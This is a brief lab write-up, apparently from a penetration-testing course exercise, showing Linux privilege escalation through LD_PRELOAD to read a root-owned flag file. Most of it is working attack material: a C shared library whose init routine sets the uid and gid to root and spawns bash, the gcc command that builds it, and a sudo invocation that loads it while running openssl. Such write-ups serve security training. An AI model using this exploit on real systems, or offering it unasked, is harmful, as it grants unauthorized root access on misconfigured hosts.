# [Shared Libraries](Shared%20Libraries.md)
### Escalate privileges using LD_PRELOAD technique. Submit the contents of the flag.txt file in the /root/ld_preload directory.

```shell
sudo -l
```
![](Screenshot%202026-08-10%20at%2014.24.49.png)

Create a `shell.c`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

Then, I compiled it
```shell
gcc -fPIC -shared -o root.so shell.c -nostartfiles
```

```shell
sudo LD_PRELOAD=/home/htb-student/root.so /usr/bin/openssl
```
![](Screenshot%202026-08-10%20at%2014.34.27.png)
